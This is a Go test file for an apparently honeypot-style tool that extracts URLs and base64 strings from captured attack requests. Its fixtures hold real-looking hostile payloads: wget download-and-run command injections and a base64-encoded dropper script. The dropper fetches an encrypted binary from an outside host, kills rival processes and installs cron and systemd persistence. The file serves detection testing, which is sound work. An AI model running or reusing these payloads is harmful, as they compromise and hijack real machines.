package backend

import (
	"loophid/pkg/database"
	"testing"
)

func TestExtractUrls(t *testing.T) {

	for _, test := range []struct {
		description  string
		textToSearch string
		urlsToFind   []string
	}{
		{
			description:  "finds full url",
			textToSearch: "http://www.example.org/foo?aa=bb&cc=dd#oo",
			urlsToFind:   []string{"http://www.example.org/foo?aa=bb&cc=dd#oo"},
		},
		{
			description:  "finds multiple urls",
			textToSearch: "http://www.example.org/ http://127.0.0.1/",
			urlsToFind:   []string{"http://www.example.org/", "http://127.0.0.1/"},
		},
		{
			description:  "finds multiple urls",
			textToSearch: "http://www.example.org/ http://127.0.0.1/",
			urlsToFind:   []string{"http://www.example.org/", "http://127.0.0.1/"},
		},
		{
			description:  "finds from shell script",
			textToSearch: "cd /dev;wget http://117.253.245.157:38630/i;chmod ",
			urlsToFind:   []string{"http://117.253.245.157:38630/i"},
		},
		{
			description:  "finds from command injection",
			textToSearch: "exefile=cd /tmp; wget http://interpol.edu.pl/fuez/potar.sh -O jdsp.sh; chmod 777 jdsp.sh;sh jdsp.sh Avtech;rm -rf jdsp.sh",
			urlsToFind:   []string{"http://interpol.edu.pl/fuez/potar.sh"},
		},
	} {

		t.Run(test.description, func(t *testing.T) {
			r := ExtractUrls(test.textToSearch)
			if len(r) != len(test.urlsToFind) {
				t.Errorf("expected %d, got %d urls (%v)", len(test.urlsToFind), len(r), r)
			}
		})
	}
}
func TestFindBase64Strings(t *testing.T) {
	for _, test := range []struct {
		description   string
		request       database.Request
		base64sToFind []string
		asciiOnly     bool
	}{
		{
			description: "finds full match",
			request: database.Request{
				Body: []byte("aGVsbG8="),
				Uri:  "/fake",
			},
			base64sToFind: []string{"aGVsbG8="},
			asciiOnly:     true,
		},
		{
			description: "finds with rubbish after padding",
			request: database.Request{
				Body: []byte("aGVsbG8=a YQ=="),
				Uri:  "/fake",
			},
			base64sToFind: []string{"aGVsbG8=", "YQ=="},
			asciiOnly:     true,
		},
		{
			description: "finds multiple in body",
			request: database.Request{
				Body: []byte("aGVsbG8= d29ybGQ="),
				Uri:  "/fake",
			},
			base64sToFind: []string{"aGVsbG8=", "d29ybGQ="},
			asciiOnly:     true,
		},
		{
			description: "finds multiple in body and uri",
			request: database.Request{
				Body: []byte("aGVsbG8= d29ybGQ="),
				Uri:  "/fake?aa=YQ==",
			},
			base64sToFind: []string{"aGVsbG8=", "d29ybGQ=", "YQ=="},
			asciiOnly:     true,
		},
		{
			description: "finds multiple in body and uri (encoded)",
			request: database.Request{
				Body: []byte("aGVsbG8= d29ybGQ="),
				Uri:  "/fake?aa=YQ%3D%3D",
			},
			base64sToFind: []string{"aGVsbG8=", "d29ybGQ=", "YQ=="},
			asciiOnly:     true,
		},
		{
			description: "recovers invalid prefix",
			request: database.Request{
				Body: []byte("+aGVsbG8="),
				Uri:  "/fake",
			},
			base64sToFind: []string{"aGVsbG8="},
			asciiOnly:     true,
		},
		{
			description: "ignores invalid",
			request: database.Request{
				Body: []byte("aGVsbG8"),
				Uri:  "/fake",
			},
			base64sToFind: []string{},
			asciiOnly:     true,
		},
		{
			description: "ignores too small",
			request: database.Request{
				Body: []byte("a="),
				Uri:  "/fake",
			},
			base64sToFind: []string{},
			asciiOnly:     true,
		},
		{
			description: "ignores binary",
			request: database.Request{
				Body: []byte("/gEK"),
				Uri:  "/fake",
			},
			base64sToFind: []string{},
			asciiOnly:     true,
		},
		{
			description: "does not ignore binary",
			request: database.Request{
				Body: []byte("/gEK"),
				Uri:  "/fake",
			},
			base64sToFind: []string{"/gEK"},
			asciiOnly:     false,
		},
		{
			description: "parses body as form",
			request: database.Request{
				Body: []byte("aaaa=YWE%3D&foo=cmd+YmI%3D"),
				Raw:  "this is a hack application/x-www-form-urlencoded",
				Uri:  "/fake",
			},
			base64sToFind: []string{"YWE=", "YmI="},
			asciiOnly:     false,
		},
		{
			description: "handles real payload",
			request: database.Request{
				Uri:  "/fake",
				Body: []byte("script=def command = 'echo IyEvYmluL3NoCnJlYWRsaW5rIC9wcm9jL3NlbGYvZXhlIHwgZ3JlcCBidXN5Ym94CmlmIFsgJD8gLWVxIDAgXTsgdGhlbgogIGVjaG8gImJ1c3liaXQiCiAgZXhpdCAxCmZpCnBzIGF1eCB8IGF3ayAne2lmKCQzID4gOTApIHByaW50ICQyfScgfCB4YXJncyBraWxsIC1TSUdTVE9QCnBzIC1BIC1vIHN0YXQscGlkIHwgZ3JlcCAnXlQnIHwgYXdrICd7cHJpbnQgJDJ9JyB8IHhhcmdzIGtpbGwgLTkKaWYgWyAiJChpZCAtdSkiICE9ICIwIiBdOyB0aGVuCiAgZGlycj0kKHRpbWVvdXQgMzAgZmluZCAvIC10eXBlIGQgXCggLXBhdGggL3Byb2MgLW8gLXBhdGggL3N5cyBcKSAtcHJ1bmUgLW8gLXdyaXRhYmxlIC1leGVjdXRhYmxlIC10eXBlIGQgLXByaW50IDI+L2Rldi9udWxsIHwgaGVhZCAtbiAxKQpmaQppZiBbICIkZGlyciIgPSAiIiBdOyB0aGVuCiAgZGlycj0vdG1wCmZpCmRpcnI9IiRkaXJyL2R1ZXQiCm1rZGlyICRkaXJyCmNobW9kIDc3NyAkZGlycgpjZCAkZGlycgpzaGEyNTZzdW0gYXBwIHwgZ3JlcCBmYjEwMWY0ZGI3NzNhZDE1ZTNkZTQwMTZlNGI2NTE2YTcyMzJkYzQ5OWQ4ODY5YTI3OTUyNGJmMzRhMjhmMTU2CmlmIFsgJD8gLW5lIDAgXTsgdGhlbgogIGNobW9kIDc1NSBhcHAKICBuYW09ImNlcnQiCiAgZWRzPSJodHRwczovL2JlcnJ5c3RvcmUubWUvbGluZS1hdXRoLyRuYW0iCiAgdGltZW91dCAxMjAgY3VybCAtbyAkbmFtIC0taW5zZWN1cmUgJGVkcwogIGlmIFsgJD8gLW5lIDAgXTsgdGhlbgogICAgdGltZW91dCAxMjAgd2dldCAtTyAkbmFtICRlZHMKICAgIGlmIFsgJD8gLW5lIDAgXTsgdGhlbgogICAgICBwcmludGYgIkdFVCAvbGluZS1hdXRoLyRuYW0gSFRUUC8xLjBcclxuSG9zdDogYmVycnlzdG9yZS5tZTo0NDNcclxuXHJcbiIgfCB0aW1lb3V0IDEyMCBvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCBiZXJyeXN0b3JlLm1lOjQ0MyAyPi9kZXYvbnVsbCB8IHRhaWwgLS1ieXRlIDMzNzYyMDggPiAkbmFtICAKICAgIGZpCiAgZmkKICBvcGVuc3NsIGVuYyAtaW4gY2VydCAtZCAtYWVzMjU2IC1tZCBzaGEyNTYgLXBhc3MgJ3Bhc3M6Q00jZjM0RyNUJFYjKmc1ZVRSNSR0cicgfCB0YXIgLXp4ZiAtCiAgcm0gY2VydApmaQpjaG1vZCA3NTUgYXBwCgpjcm9ubnk9IiogKiAqICogKiAvdXNyL2Jpbi9mbG9jayAtbiAvdmFyL3RtcC92ZXJsLmxvY2sgLWMgJ2NkICRkaXJyOyBleGVjIC4vYXBwICYnIgooY3JvbnRhYiAtbCAyPi9kZXYvbnVsbDsgZWNobyAiJGNyb25ueSIpIHwgYXdrICchYVskMF0rKycgfCBjcm9udGFiIC0KCkRCVVNfU0VTU1NJT05fQlVTX0FERFJFU1M9dW5peDovcnVuL3VzZXIvJChpZCAtdSkvYnVzIHN5c3RlbWQtcnVuIC0tdXNlciAtLW9uLWNhbGVuZGFyPScqOio6MDAnIC91c3IvYmluL2Zsb2NrIC1uIC92YXIvdG1wL3ZlcmwubG9jayAtYyAnY2QgJGRpcnI7IGV4ZWMgLi9hcHAgJicKCmVjaG8gIjAgUGpjYjQzYTI5MCIgPiBzdHJwdHIKdHJhcCAnJyBTSUcKKCBzbGVlcCA0MDsga2lsbCAtOSAkUFBJRCApICYKZXhlYyAuL2FwcAo= | base64 --decode | sh'; def proc = ['sh', '-c', command].execute(); proc.waitFor();"),
			},
			base64sToFind: []string{"IyEvYmluL3NoCnJlYWRsaW5rIC9wcm9jL3NlbGYvZXhlIHwgZ3JlcCBidXN5Ym94CmlmIFsgJD8gLWVxIDAgXTsgdGhlbgogIGVjaG8gImJ1c3liaXQiCiAgZXhpdCAxCmZpCnBzIGF1eCB8IGF3ayAne2lmKCQzID4gOTApIHByaW50ICQyfScgfCB4YXJncyBraWxsIC1TSUdTVE9QCnBzIC1BIC1vIHN0YXQscGlkIHwgZ3JlcCAnXlQnIHwgYXdrICd7cHJpbnQgJDJ9JyB8IHhhcmdzIGtpbGwgLTkKaWYgWyAiJChpZCAtdSkiICE9ICIwIiBdOyB0aGVuCiAgZGlycj0kKHRpbWVvdXQgMzAgZmluZCAvIC10eXBlIGQgXCggLXBhdGggL3Byb2MgLW8gLXBhdGggL3N5cyBcKSAtcHJ1bmUgLW8gLXdyaXRhYmxlIC1leGVjdXRhYmxlIC10eXBlIGQgLXByaW50IDI+L2Rldi9udWxsIHwgaGVhZCAtbiAxKQpmaQppZiBbICIkZGlyciIgPSAiIiBdOyB0aGVuCiAgZGlycj0vdG1wCmZpCmRpcnI9IiRkaXJyL2R1ZXQiCm1rZGlyICRkaXJyCmNobW9kIDc3NyAkZGlycgpjZCAkZGlycgpzaGEyNTZzdW0gYXBwIHwgZ3JlcCBmYjEwMWY0ZGI3NzNhZDE1ZTNkZTQwMTZlNGI2NTE2YTcyMzJkYzQ5OWQ4ODY5YTI3OTUyNGJmMzRhMjhmMTU2CmlmIFsgJD8gLW5lIDAgXTsgdGhlbgogIGNobW9kIDc1NSBhcHAKICBuYW09ImNlcnQiCiAgZWRzPSJodHRwczovL2JlcnJ5c3RvcmUubWUvbGluZS1hdXRoLyRuYW0iCiAgdGltZW91dCAxMjAgY3VybCAtbyAkbmFtIC0taW5zZWN1cmUgJGVkcwogIGlmIFsgJD8gLW5lIDAgXTsgdGhlbgogICAgdGltZW91dCAxMjAgd2dldCAtTyAkbmFtICRlZHMKICAgIGlmIFsgJD8gLW5lIDAgXTsgdGhlbgogICAgICBwcmludGYgIkdFVCAvbGluZS1hdXRoLyRuYW0gSFRUUC8xLjBcclxuSG9zdDogYmVycnlzdG9yZS5tZTo0NDNcclxuXHJcbiIgfCB0aW1lb3V0IDEyMCBvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCBiZXJyeXN0b3JlLm1lOjQ0MyAyPi9kZXYvbnVsbCB8IHRhaWwgLS1ieXRlIDMzNzYyMDggPiAkbmFtICAKICAgIGZpCiAgZmkKICBvcGVuc3NsIGVuYyAtaW4gY2VydCAtZCAtYWVzMjU2IC1tZCBzaGEyNTYgLXBhc3MgJ3Bhc3M6Q00jZjM0RyNUJFYjKmc1ZVRSNSR0cicgfCB0YXIgLXp4ZiAtCiAgcm0gY2VydApmaQpjaG1vZCA3NTUgYXBwCgpjcm9ubnk9IiogKiAqICogKiAvdXNyL2Jpbi9mbG9jayAtbiAvdmFyL3RtcC92ZXJsLmxvY2sgLWMgJ2NkICRkaXJyOyBleGVjIC4vYXBwICYnIgooY3JvbnRhYiAtbCAyPi9kZXYvbnVsbDsgZWNobyAiJGNyb25ueSIpIHwgYXdrICchYVskMF0rKycgfCBjcm9udGFiIC0KCkRCVVNfU0VTU1NJT05fQlVTX0FERFJFU1M9dW5peDovcnVuL3VzZXIvJChpZCAtdSkvYnVzIHN5c3RlbWQtcnVuIC0tdXNlciAtLW9uLWNhbGVuZGFyPScqOio6MDAnIC91c3IvYmluL2Zsb2NrIC1uIC92YXIvdG1wL3ZlcmwubG9jayAtYyAnY2QgJGRpcnI7IGV4ZWMgLi9hcHAgJicKCmVjaG8gIjAgUGpjYjQzYTI5MCIgPiBzdHJwdHIKdHJhcCAnJyBTSUcKKCBzbGVlcCA0MDsga2lsbCAtOSAkUFBJRCApICYKZXhlYyAuL2FwcAo="},
			asciiOnly:     true,
		},
	} {

		t.Run(test.description, func(t *testing.T) {
			res := make(map[string][]byte)
			be := NewBase64Extractor(res, test.asciiOnly)
			be.ParseRequest(&test.request)
			if len(res) != len(test.base64sToFind) {
				t.Errorf("expected %d base64s but found %d", len(test.base64sToFind), len(res))
			}

			for _, v := range test.base64sToFind {
				_, ok := res[v]
				if !ok {
					t.Errorf("expected to find %s in %v", v, res)
				}
			}
		})
	}
}
